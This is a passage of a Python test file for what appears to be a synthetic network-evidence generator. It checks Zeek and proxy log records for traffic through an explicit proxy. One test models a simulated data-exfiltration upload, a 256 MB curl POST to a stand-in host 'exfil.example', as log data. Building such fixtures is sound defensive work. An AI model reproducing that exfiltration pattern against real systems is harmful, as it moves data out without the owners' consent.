                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="52.85.84.55",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="aws.amazon.com",
            conn_state="SF",
        )

        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.protocol.proxy.host == "aws.amazon.com"
        assert proxy_event.protocol.proxy.status_code in {301, 302}

        http_events = [
            call.args[0]
            for call in emitters["zeek_http"].emit.call_args_list
            if call.args[0].protocol.http.host == "aws.amazon.com"
        ]
        assert http_events
        assert {event.protocol.http.status_code for event in http_events}.issubset({301, 302})
        assert all(event.protocol.http.response_body_len < 1000 for event in http_events)

    def test_egress_sensor_sees_proxy_to_origin_only(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="egress-tap",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        origin_ip = resolve_domain_ip("example.com", src_host="PROXY-01")
        assert ("10.0.3.10", origin_ip, 443) in pairs
        assert ("10.0.1.10", "93.184.216.34", 443) not in pairs
        assert emitters["zeek_ssl"].emit.called
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.protocol.proxy is not None
        transaction = proxy_event.protocol.proxy.transaction
        assert transaction is not None
        dns_visible = any(pair[0] == "10.0.3.10" and pair[2] == 53 for pair in pairs)
        if transaction.resolver_mode == "resolver_cache_hit":
            assert not dns_visible
            assert not emitters["zeek_dns"].emit.called
        else:
            assert dns_visible
            assert emitters["zeek_dns"].emit.called

    def test_sensor_monitoring_both_sides_sees_both_proxy_legs(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        origin_ip = resolve_domain_ip("example.com", src_host="PROXY-01")
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        assert ("10.0.3.10", origin_ip, 443) in pairs
        assert ("10.0.1.10", "93.184.216.34", 443) not in pairs

    def test_https_miss_propagates_http_size_to_origin_tls_leg(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="GET",
                url="https://example.com/jquery.js",
                host="example.com",
                status_code=200,
                sc_bytes=107_200,
                cs_bytes=620,
                time_taken=400,
                user_agent="Mozilla/5.0",
                content_type="application/javascript",
                cache_result="MISS",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5_000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/jquery.js",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=107_000,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["application/javascript"],
            ),
        )

        origin_ip = resolve_domain_ip("example.com", src_host="PROXY-01")
        egress_events = [
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.3.10"
            and call.args[0].network.dst_ip == origin_ip
            and call.args[0].network.dst_port == 443
        ]
        assert egress_events
        assert egress_events[0].network.resp_bytes >= 107_000
        client_events = [
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        ]
        assert client_events
        assert egress_events[0].network.started_at > client_events[0].network.started_at
        client_close = client_events[0].timestamp + timedelta(
            seconds=client_events[0].network.duration
        )
        assert egress_events[0].timestamp < client_close
        egress_http_events = [
            call.args[0]
            for call in emitters["zeek_http"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.3.10"
            and call.args[0].network.dst_ip == origin_ip
            and call.args[0].network.dst_port == 443
        ]
        assert egress_http_events
        assert egress_http_events[0].protocol.http.host == "example.com"
        assert egress_http_events[0].protocol.http.uri == "/jquery.js"
        assert egress_http_events[0].protocol.http.user_agent == "Mozilla/5.0"

    def test_inspected_https_upload_client_leg_does_not_double_count_request_body(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        request_bytes = 268_435_456
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="POST",
                url="https://exfil.example/upload",
                host="exfil.example",
                status_code=200,
                sc_bytes=900,
                cs_bytes=request_bytes + 313,
                time_taken=1200,
                user_agent="curl/8.1.2",
                content_type="application/octet-stream",
                cache_result="MISS",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=12.0,
            orig_bytes=request_bytes,
            resp_bytes=512,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="exfil.example",
            conn_state="SF",
            http=HttpContext(
                method="POST",
                host="exfil.example",
                uri="/upload",
                version="1.1",
                user_agent="curl/8.1.2",
                request_body_len=request_bytes,
                response_body_len=512,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["application/octet-stream"],
            ),
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        transaction = proxy_event.protocol.proxy.transaction
        assert transaction is not None
        assert client_event.network.orig_bytes > proxy_event.protocol.proxy.cs_bytes
        assert client_event.network.orig_bytes >= (
            proxy_event.protocol.proxy.cs_bytes + transaction.tunnel_setup_cs_bytes
        )
        assert client_event.network.resp_bytes >= (
            proxy_event.protocol.proxy.sc_bytes + transaction.tunnel_setup_sc_bytes
        )
        assert client_event.network.orig_bytes < request_bytes * 2

    def test_allowed_proxy_miss_origin_leg_is_established_when_state_is_implicit(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="egress-tap",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=200,
                sc_bytes=107_200,
                cs_bytes=620,
                time_taken=400,
                user_agent="Mozilla/5.0",
                content_type="application/javascript",
                cache_result="MISS",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5_000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/jquery.js",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=107_000,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["application/javascript"],
            ),
        )

        origin_ip = resolve_domain_ip("example.com", src_host="PROXY-01")
        egress_events = [
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.3.10"
            and call.args[0].network.dst_ip == origin_ip
            and call.args[0].network.dst_port == 443
        ]
        assert egress_events
        assert egress_events[0].network.conn_state == "SF"
        assert egress_events[0].protocol.ssl is not None
        assert egress_events[0].protocol.ssl.established is True

    def test_proxy_open_preparation_rejects_direct_http_owner_before_any_preparation(self):
        """A malformed dual-manager request is State/RNG/runtime/timing/output neutral."""

        from evidenceforge.generation.activity.helpers import _get_rng

        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        start = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
        client_capture = NetworkConnectionIdentityCapture()
        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="10.0.3.10",
            time=start,
            dst_port=8080,
            proto="tcp",
            service="http",
            duration=2.0,
            orig_bytes=400,
            resp_bytes=800,
            source_system=generator._ip_to_system["10.0.1.10"],
            proxy_bypass=True,
            suppress_direct_http_channel=True,
            identity_capture=client_capture,
        )
        client_root = client_capture.require_prepared_root()
        client_receipt = client_capture.require_receipt()
        client = client_root.result.transaction
        assert client.closed_at is not None
        phase = ProxyTransactionPlan(
            stable_id="dual-manager-rejection",
            terminal_outcome="success",
            resolver_mode=None,
            client_connect_at=client.started_at,
            tunnel_request_at=client.started_at + timedelta(milliseconds=10),
            request_at=client.started_at + timedelta(milliseconds=20),
            decision_at=client.started_at + timedelta(milliseconds=30),
            dns_query_at=None,
            dns_response_at=None,
            origin_connect_at=None,
            tls_complete_at=None,
            origin_request_at=None,
            origin_response_at=None,
            origin_close_at=None,
            client_flush_at=client.started_at + timedelta(milliseconds=40),
            close_at=client.started_at + timedelta(milliseconds=50),
            origin_conn_state=None,
        )
        proxy_context = ProxyContext(
            client_ip="10.0.1.10",
            method="GET",
            url="https://example.com/",
            host="example.com",
            status_code=200,
            cs_bytes=200,
            sc_bytes=1200,
            user_agent="Mozilla/5.0",
            cache_result="MISS",
            proxy_fqdn="PROXY-01.example.org",
            transaction=phase,
        )
        preparation = ExplicitProxyOpenPreparation(
            affinity=ExplicitProxyChannelAffinity(
                client_ip="10.0.1.10",
                proxy_ip="10.0.3.10",
                proxy_port=8080,
                origin_host="example.com",
                origin_ip="93.184.216.34",
                origin_port=443,
                user_agent="Mozilla/5.0",
                auth_identity="",
                policy_id="default",
            ),
            client_root=client_root,
            client_receipt=client_receipt,
            phase_plan=phase,
            proxy_context=proxy_context,
            tunnel_group_id="dual-manager-rejection",
            planned_request_count=1,
        )
        assert generator._lifecycle_authority.authenticates_prepared_network_receipt(
            client_root,
            client_receipt,
        )
        state_before = generator.state_manager.materialization_digest()
        rng_before = _get_rng().getstate()
        runtime_before = generator._network_transaction_runtime.census()
        timing_before = generator.timing_runtime.audit.snapshot()
        source_timing_before = generator._source_timing_planner.census()
        proxy_before = generator._proxy_channel_manager.census()
        http_before = generator._http_channel_manager.census()
        common_before = generator._application_channel_registry.census()
        output_before = {name: emitter.emit.call_count for name, emitter in emitters.items()}

        with pytest.raises(ValueError, match="must suppress the direct HTTP channel"):
            NetworkConnectionActionBundle(
                generator,
                NetworkConnectionRequest(
                    src_ip="10.0.3.10",
                    dst_ip="93.184.216.34",
                    time=start + timedelta(milliseconds=100),
                    dst_port=443,
                    proto="tcp",
                    service="ssl",
                    duration=1.0,
                    orig_bytes=200,
                    resp_bytes=1200,
                    source_system=generator._ip_to_system["10.0.3.10"],
                    http=HttpContext(
                        method="GET",
                        host="example.com",
                        uri="/",
                        user_agent="Mozilla/5.0",
                        response_body_len=1200,
                    ),
                    proxy_bypass=True,
                    explicit_proxy_open_preparation=preparation,
                ),
            ).execute()

        assert generator.state_manager.materialization_digest() == state_before
        assert _get_rng().getstate() == rng_before
        assert generator._network_transaction_runtime.census() == runtime_before
        assert generator.timing_runtime.audit.snapshot() == timing_before
        assert generator._source_timing_planner.census() == source_timing_before
        assert generator._proxy_channel_manager.census() == proxy_before
        assert generator._http_channel_manager.census() == http_before
        assert generator._application_channel_registry.census() == common_before
        assert {
            name: emitter.emit.call_count for name, emitter in emitters.items()
        } == output_before

    @pytest.mark.parametrize("tamper_target", ["proxy", "common"])
    def test_local_proxy_request_token_tamper_releases_both_prepared_capabilities(
        self,
        tamper_target: str,
    ):
        """Planner rejection owns and cancels local proxy/common capabilities before runtime."""

        from evidenceforge.generation.activity.helpers import _get_rng

        generator, emitters = _generator([])
        start = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
        capture = NetworkConnectionIdentityCapture()
        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="10.0.3.10",
            time=start,
            dst_port=8080,
            proto="tcp",
            service="http",
            duration=30.0,
            orig_bytes=800,
            resp_bytes=2_400,
            source_system=generator._ip_to_system["10.0.1.10"],
            proxy_bypass=True,
            suppress_direct_http_channel=True,
            identity_capture=capture,
        )
        parent = capture.require()
        assert parent.closed_at is not None
        affinity = ExplicitProxyChannelAffinity(
            client_ip=parent.src_ip,
            proxy_ip=parent.dst_ip,
            proxy_port=parent.dst_port,
            origin_host="example.com",
            origin_ip="93.184.216.34",
            origin_port=443,
            user_agent="Mozilla/5.0",
            auth_identity="",
            policy_id="default",
        )
        opened = generator._proxy_channel_manager.open_tunnel(
            affinity,
            client_transport_id=parent.stable_id,
            origin_transport_id="manual-origin-transport",
            client_zeek_uid=parent.zeek_uid,
            origin_zeek_uid="CmanualOrigin12345",
            tunnel_group_id="local-tamper",
            client_source_port=parent.src_port,
            origin_source_port=40_001,
            opened_at=parent.started_at,
            closes_at=parent.closed_at,
            setup_started_at=parent.started_at + timedelta(milliseconds=10),
            setup_completed_at=parent.started_at + timedelta(milliseconds=20),
            setup_request_wire_bytes=100,
            setup_response_wire_bytes=200,
            planned_request_count=2,
            aggregate_request_wire_bytes=500,
            aggregate_response_wire_bytes=1_000,
        )
        assert opened is not None
        token = generator._proxy_channel_manager.prepare_request(
            affinity,
            requested_at=start + timedelta(seconds=1),
            completed_at=start + timedelta(seconds=1, milliseconds=50),
            request_wire_bytes=100,
            response_wire_bytes=200,
        )
        assert token is not None
        if tamper_target == "proxy":
            object.__setattr__(token, "_owner_id", "retargeted-owner")
        else:
            object.__setattr__(token.application_token, "_integrity_token", "0" * 64)

        state_before = generator.state_manager.materialization_digest()
        rng_before = _get_rng().getstate()
        runtime_before = generator._network_transaction_runtime.census()
        timing_before = generator.timing_runtime.audit.snapshot()
        source_timing_before = generator._source_timing_planner.census()
        output_before = {name: emitter.emit.call_count for name, emitter in emitters.items()}
        with pytest.raises(StateError, match="authentic proxy request admission"):
            NetworkConnectionActionBundle(
                generator,
                NetworkConnectionRequest(
                    src_ip=parent.src_ip,
                    dst_ip=parent.dst_ip,
                    time=start + timedelta(seconds=1),
                    dst_port=parent.dst_port,
                    proto=parent.protocol,
                    service="http",
                    duration=0.05,
                    orig_bytes=100,
                    resp_bytes=200,
                    src_port=parent.src_port,
                    source_system=generator._ip_to_system["10.0.1.10"],
                    proxy=ProxyContext(
                        client_ip=parent.src_ip,
                        method="GET",
                        url="https://example.com/reused",
                        host="example.com",
                        status_code=200,
                        cs_bytes=100,
                        sc_bytes=200,
                        user_agent="Mozilla/5.0",
                        cache_result="HIT",
                        proxy_fqdn="PROXY-01.example.org",
                    ),
                    proxy_bypass=True,
                    suppress_direct_http_channel=True,
                    suppress_application_side_effects=True,
                    suppress_source_pid_inference=True,
                    prepared_application_token=token,
                ),
            ).execute()

        proxy_census = generator._proxy_channel_manager.census()
        assert proxy_census.prepared_admissions == 0
        assert proxy_census.claimed_admissions == 0
        assert proxy_census.application.prepared_admissions == 0
        assert proxy_census.application.claimed_admissions == 0
        assert (
            generator._proxy_channel_manager.get_tunnel(opened.tunnel.channel_id) == opened.tunnel
        )
        assert generator.state_manager.materialization_digest() == state_before
        assert _get_rng().getstate() == rng_before
        assert generator._network_transaction_runtime.census() == runtime_before
        assert generator.timing_runtime.audit.snapshot() == timing_before
        assert generator._source_timing_planner.census() == source_timing_before
        assert {
            name: emitter.emit.call_count for name, emitter in emitters.items()
        } == output_before

    def test_https_subresources_reuse_preplanned_payload_capacity(self, monkeypatch):
        from evidenceforge.generation.activity.dns_registry import resolve_domain_ip

        lifecycle_modes: list[str] = []
        original_publish = NetworkConnectionIdentityCapture._publish_committed_claimed

        def record_lifecycle_mode(
            capture,
            claim,
            *,
            root,
            receipt,
            application_receipt=None,
            outcome,
        ):
            lifecycle_modes.append(root.runtime_token.lifecycle_mode)
            original_publish(
                capture,
                claim,
                root=root,
                receipt=receipt,
                application_receipt=application_receipt,
                outcome=outcome,
            )

        monkeypatch.setattr(
            NetworkConnectionIdentityCapture,
            "_publish_committed_claimed",
            record_lifecycle_mode,
        )
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)

        first_uid = generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=start_time,
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=30.0,
            orig_bytes=1500,
            resp_bytes=8000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            emit_dns=True,
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=5000,
                flow_request_body_len=200,
                flow_response_body_len=6200,
                flow_transaction_count=2,
                status_code=200,
                status_msg="OK",
            ),
        )
        pairs_after_first = list(_conn_pairs(emitters))
        proxy_calls_after_first = emitters["proxy_access"].emit.call_count
        ssl_calls_after_first = emitters["zeek_ssl"].emit.call_count
        first_census = generator._proxy_channel_manager.census()
        assert first_census.open_tunnel_views == 1
        assert first_census.application.open_channels == 1
        assert first_census.application.used_operation_ids == 1
        assert generator._application_channel_registry.census().open_channels == 1
        assert generator._http_channel_manager.census().open_transport_views == 0
        assert lifecycle_modes == ["network", "network"]
        reused_uid = generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=start_time + timedelta(seconds=12),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=0.2,
            orig_bytes=200,
            resp_bytes=1200,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            emit_dns=True,
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/app.js",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=1200,
                trans_depth=2,
                status_code=200,
                status_msg="OK",
            ),
        )

        assert reused_uid == first_uid
        assert _conn_pairs(emitters) == pairs_after_first
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs_after_first
        resolved_origin_ip = resolve_domain_ip("example.com", src_host="PROXY-01")
        assert ("10.0.3.10", resolved_origin_ip, 443) in pairs_after_first
        assert emitters["proxy_access"].emit.call_count == proxy_calls_after_first + 1
        reused_proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert reused_proxy_event.network.application_layer_only is True
        assert reused_proxy_event.network.zeek_uid == reused_uid
        assert reused_proxy_event.protocol.proxy.url == "https://example.com/app.js"
        assert emitters["zeek_ssl"].emit.call_count == ssl_calls_after_first
        reused_census = generator._proxy_channel_manager.census()
        assert reused_census.open_tunnel_views == 1
        assert reused_census.application.open_channels == 1
        assert reused_census.application.used_operation_ids == 2
        assert generator._application_channel_registry.census().open_channels == 1
        assert generator._http_channel_manager.census().open_transport_views == 0
        assert lifecycle_modes == ["network", "network", "application_child"]

    def test_late_inspected_requests_preflight_to_request_local_setup_only(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A late three-request flow uses exact request-local authenticated transports."""

        publications: list[NetworkConnectionIdentityCapture] = []
        original_publish = NetworkConnectionIdentityCapture._publish_committed_claimed

        def record_publication(
            capture: NetworkConnectionIdentityCapture,
            claim: object,
            *,
            root: object,
            receipt: object,
            application_receipt: object | None = None,
            prepared_dispatch: object | None = None,
            outcome: object,
        ) -> None:
            original_publish(
                capture,
                claim,
                root=root,
                receipt=receipt,
                application_receipt=application_receipt,
                prepared_dispatch=prepared_dispatch,
                outcome=outcome,
            )
            publications.append(capture)

        monkeypatch.setattr(
            NetworkConnectionIdentityCapture,
            "_publish_committed_claimed",
            record_publication,
        )
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        prepare_calls: list[dict[str, object]] = []
        prepare_affinities: list[object] = []
        original_prepare = generator._proxy_channel_manager.prepare_open_tunnel

        def record_prepare(*args: object, **kwargs: object) -> object:
            assert len(args) == 1
            prepare_affinities.append(args[0])
            prepare_calls.append(dict(kwargs))
            return original_prepare(*args, **kwargs)

        monkeypatch.setattr(
            generator._proxy_channel_manager,
            "prepare_open_tunnel",
            record_prepare,
        )
        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
        request_specs = (
            (start_time, "/", 1.0, 240, 1800, 1200, 1),
            (start_time + timedelta(seconds=2), "/app.js", 0.3, 180, 900, 700, 2),
            (start_time + timedelta(seconds=4), "/favicon.ico", 0.2, 160, 700, 500, 3),
        )
        returned_uids = []
        for request_time, uri, duration, orig_bytes, resp_bytes, body_bytes, depth in request_specs:
            returned_uids.append(
                generator.generate_connection(
                    src_ip="10.0.1.10",
                    dst_ip="93.184.216.34",
                    time=request_time,
                    dst_port=443,
                    proto="tcp",
                    service="ssl",
                    duration=duration,
                    orig_bytes=orig_bytes,
                    resp_bytes=resp_bytes,
                    source_system=generator._ip_to_system["10.0.1.10"],
                    hostname="example.com",
                    conn_state="SF",
                    http=HttpContext(
                        method="GET",
                        host="example.com",
                        uri=uri,
                        version="1.1",
                        user_agent="Mozilla/5.0",
                        response_body_len=body_bytes,
                        flow_request_body_len=480 if depth == 1 else None,
                        flow_response_body_len=3600 if depth == 1 else None,
                        flow_transaction_count=3 if depth == 1 else None,
                        trans_depth=depth,
                        status_code=200,
                        status_msg="OK",
                    ),
                )
            )

        physical_events = [
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if not call.args[0].network.application_layer_only
        ]
        client_events = [
            event
            for event in physical_events
            if event.network.src_ip == "10.0.1.10"
            and event.network.dst_ip == "10.0.3.10"
            and event.network.dst_port == 8080
        ]
        origin_events = [
            event
            for event in physical_events
            if event.network.src_ip == "10.0.3.10" and event.network.dst_port == 443
        ]
        proxy_events = [call.args[0] for call in emitters["proxy_access"].emit.call_args_list]
        assert len(client_events) == 3
        assert len(origin_events) == 3
        assert len(proxy_events) == 3
        assert [
            (event.network.orig_bytes, event.network.resp_bytes) for event in client_events
        ] == [(846, 1615), (636, 932), (566, 697)]
        assert [
            (event.network.orig_bytes, event.network.resp_bytes) for event in origin_events
        ] == [(768, 6219), (619, 3601), (792, 5520)]
        assert [
            (event.protocol.proxy.cs_bytes, event.protocol.proxy.sc_bytes) for event in proxy_events
        ] == [(367, 1439), (316, 789), (335, 567)]
        assert [event.protocol.proxy.url for event in proxy_events] == [
            "https://example.com/",
            "https://example.com/app.js",
            "https://example.com/favicon.ico",
        ]
        assert len(set(returned_uids)) == 3
        assert {event.network.zeek_uid for event in client_events} == set(returned_uids)
        assert len({event.network.zeek_uid for event in origin_events}) == 3

        clients_by_id = {
            capture.require().stable_id: capture
            for capture in publications
            if capture.transaction is not None
            and capture.transaction.src_ip == "10.0.1.10"
            and capture.transaction.dst_ip == "10.0.3.10"
            and capture.transaction.dst_port == 8080
        }
        origin_captures = [
            capture
            for capture in publications
            if capture.transaction is not None
            and capture.transaction.src_ip == "10.0.3.10"
            and capture.transaction.dst_port == 443
        ]
        assert len(clients_by_id) == 3
        assert len(origin_captures) == 3
        proxy_events_by_group = {
            event.protocol.proxy.transaction.stable_id: event
            for event in proxy_events
            if event.protocol.proxy.transaction is not None
        }
        reserved_request_bytes = 0
        reserved_response_bytes = 0
        channel_ids: set[str] = set()
        application_receipt_tokens: set[str] = set()
        for origin_capture in origin_captures:
            origin = origin_capture.require()
            application_receipt = origin_capture.require_application_receipt()
            assert isinstance(application_receipt, ExplicitProxyAdmissionReceipt)
            assert generator._proxy_channel_manager.authenticates_admission_receipt(
                application_receipt
            )
            assert application_receipt.current_transport_id == origin.stable_id
            assert len(application_receipt.prerequisite_transport_ids) == 1
            client_capture = clients_by_id[application_receipt.prerequisite_transport_ids[0]]
            client = client_capture.require()

            opened = application_receipt.sidecar_result
            assert isinstance(opened, ExplicitProxyTunnelOpen)
            channel_ids.add(opened.tunnel.channel_id)
            application_receipt_tokens.add(application_receipt.application_receipt_token)
            assert opened.tunnel.planned_request_count == 0
            assert opened.remaining_request_count == 0
            assert opened.remaining_request_wire_bytes == 0
            assert opened.remaining_response_wire_bytes == 0
            common_receipt = application_receipt.application_receipt
            assert common_receipt.kind == "open_completed_close"
            snapshot = common_receipt.snapshot
            proxy_event = proxy_events_by_group[opened.tunnel.tunnel_group_id]
            phase = proxy_event.protocol.proxy.transaction
            assert phase is not None
            assert client.closed_at is not None
            assert snapshot.closed_at == phase.client_flush_at
            assert snapshot.last_activity_at == phase.client_flush_at
            assert snapshot.close_reason == "setup-only"
            assert snapshot.reserved_operations == 1
            assert snapshot.completed_operations == 1
            assert snapshot.reserved_initiator_bytes == (
                phase.tunnel_setup_cs_bytes + proxy_event.protocol.proxy.cs_bytes
            )
            assert snapshot.reserved_responder_bytes == (
                phase.tunnel_setup_sc_bytes + proxy_event.protocol.proxy.sc_bytes
            )
            assert client.orig_bytes == snapshot.reserved_initiator_bytes
            assert client.resp_bytes == snapshot.reserved_responder_bytes
            reserved_request_bytes += snapshot.reserved_initiator_bytes
            reserved_response_bytes += snapshot.reserved_responder_bytes

            origin_receipt = origin_capture.require_receipt()
            client_receipt = client_capture.require_receipt()
            assert origin_receipt.connection_receipt.prerequisite_proofs[0].receipt_token == (
                client_receipt.connection_receipt.receipt_token
            )

        assert sum(event.network.orig_bytes for event in client_events) == reserved_request_bytes
        assert sum(event.network.resp_bytes for event in client_events) == reserved_response_bytes
        assert len(channel_ids) == 3
        assert len(application_receipt_tokens) == 3
        assert [call["planned_request_count"] for call in prepare_calls] == [0, 0, 0]
        assert all(call["aggregate_request_wire_bytes"] == 0 for call in prepare_calls)
        assert all(call["aggregate_response_wire_bytes"] == 0 for call in prepare_calls)
        assert len(prepare_affinities) == 3
        census = generator._proxy_channel_manager.census()
        assert census.open_tunnel_views == 0
        assert census.prepared_admissions == 0
        assert census.claimed_admissions == 0
        assert census.reserved_channel_ids == 0
        assert census.reserved_affinities == 0
        assert census.reserved_origin_transport_ids == 0
        assert census.application.open_channels == 0
        assert census.application.active_operations == 0
        assert census.application.prepared_admissions == 0
        assert census.application.claimed_admissions == 0
        assert census.application.reserved_channel_ids == 0
        assert census.application.reserved_transport_ids == 0
        assert census.application.reserved_operation_ids == 0

    def test_proxy_manager_owns_one_parent_transport_and_three_browser_children(self):
        """One BrowserSession aggregate must not duplicate tunnel setup or physical legs."""

        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
        request_specs = (
            (start_time, "/", 1, 3, 5000, 800),
            (start_time + timedelta(seconds=8), "/app.js", 2, 1, 2200, 140),
            (start_time + timedelta(seconds=16), "/theme.css", 3, 1, 1800, 120),
        )
        uids: list[str] = []
        for request_time, uri, depth, flow_count, response_bytes, request_bytes in request_specs:
            uids.append(
                generator.generate_connection(
                    src_ip="10.0.1.10",
                    dst_ip="93.184.216.34",
                    time=request_time,
                    dst_port=443,
                    proto="tcp",
                    service="ssl",
                    duration=45.0 if depth == 1 else 0.2,
                    orig_bytes=request_bytes,
                    resp_bytes=response_bytes,
                    source_system=generator._ip_to_system["10.0.1.10"],
                    hostname="example.com",
                    emit_dns=True,
                    conn_state="SF",
                    http=HttpContext(
                        method="POST" if depth == 1 else "GET",
                        host="example.com",
                        uri=uri,
                        version="1.1",
                        user_agent="Mozilla/5.0",
                        request_body_len=600 if depth == 1 else 0,
                        response_body_len=response_bytes,
                        flow_request_body_len=940 if depth == 1 else None,
                        flow_response_body_len=9000 if depth == 1 else None,
                        flow_transaction_count=flow_count,
                        trans_depth=depth,
                        status_code=200,
                        status_msg="OK",
                    ),
                )
            )

        assert len(set(uids)) == 1
        physical_events = [
            call.args[0]
